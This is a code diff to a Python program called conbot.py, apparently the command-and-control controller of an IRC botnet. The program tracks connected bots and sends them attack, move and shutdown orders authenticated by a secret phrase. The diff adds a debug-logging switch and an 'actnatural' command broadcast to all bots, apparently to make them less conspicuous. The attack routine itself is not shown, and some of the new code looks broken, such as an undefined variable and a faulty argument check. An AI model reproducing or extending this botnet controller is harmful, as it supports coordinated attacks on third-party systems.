@@ -19,7 +19,7 @@ def eprint(*args, **kwargs):
 
     
 class ConBot:
-    def __init__(self, server, name, channel, port, secret):
+    def __init__(self, server, name, channel, port, secret, debug):
         self._server = server
         #need to generate nick
         self._nick = name
@@ -28,6 +28,7 @@ class ConBot:
         self._secret = secret
         self._running = True
         self._bots = []
+        self._debug = debug
         
         self._botcount = 0
         self._atksucc = 0
@@ -64,12 +65,14 @@ class ConBot:
 
     def logSend(self, msg):
         msg = bytes(msg)
-        eprint("--> sending: {0}{1}{2}".format(colors.BLUE, str(msg), colors.ENDC))
+        if self._debug:
+            eprint("--> sending: {0}{1}{2}".format(colors.BLUE, str(msg), colors.ENDC))
         self._socket.send(msg)
 
     def logRecv(self):
         response = self._socket.recv(1024).decode("utf-8")
-        eprint("<-- received: {0}{1}{2}".format(colors.WARNING, response, colors.ENDC))
+        if self._debug:
+            eprint("<-- received: {0}{1}{2}".format(colors.WARNING, response, colors.ENDC))
         responses = response.split("\r\n")
         return responses[:len(responses) - 1]
 
@@ -80,9 +83,10 @@ class ConBot:
         
     def debugLogResponse(self, prefix, command, args):
         """ """
-        eprint("prefix: {0}".format(prefix))
-        eprint("command: {0}".format(command))
-        eprint("args: {0}".format(args))
+        if self._debug:
+            eprint("prefix: {0}".format(prefix))
+            eprint("command: {0}".format(command))
+            eprint("args: {0}".format(args))
 
     def doWork(self):
         """ """
@@ -187,6 +191,11 @@ class ConBot:
 
         return False
 
+    def actNatural(self, command, howToAct):
+        for bot in self._bots:
+            msg = "PRIVMSG {0} :{1} {2} {3}\r\n".format(bot, secret, command, howToAct).encode('utf-8')
+            self.logSend(msg)
+    
     def attack(self, commandParts):
         """ handles attack command """
         if len(self._bots) == 0:
@@ -286,17 +295,22 @@ def handleCommands(controller):
             controller.shutdown(commandParts[0])
         elif commandParts[0] == "move":
             controller.move(commandParts)
+        elif commandParts[0] == "actnatural":
+            if len(commandParts) != 2:
+                print("Invalid syntax. Usage is actnatural [true|false]")
+            else:
+                controller.actNatural(commandParts[0], commandParts[1])
         else:
-            print("Invalid command!");
+            print("{0} is an invalid command.".format(commandParts[0]).encode('utf-8'));
             
         command=sys.stdin.readline()
     
 
 if __name__ == "__main__":
 
-    if len(sys.argv) != 5:
+    if (len(sys.argv) == 6 and sys.argv[5] != "debug") and len(sys.argv) != 5:
         eprint("Invalid usage. Usage: ")
-        eprint("python3 conbot.py <hostname> <port> <channel> <secret-phrase>")
+        eprint("python3 conbot.py <hostname> <port> <channel> <secret-phrase> [debug]")
     else:
         try:
             host = sys.argv[1]
@@ -305,7 +319,12 @@ if __name__ == "__main__":
             chan = sys.argv[3]
             secret = sys.argv[4]
 
-            controller = ConBot(host, "leeroy_jenkins", chan, port, secret)
+            if len(sys.argv) == 6:
+                debug = True
+            else:
+                debug = False
+
+            controller = ConBot(host, "leeroy_jenkins", chan, port, secret, debug)
             conbot = threading.Thread(target=controller.doWork, args=())
             conbot.start()
 
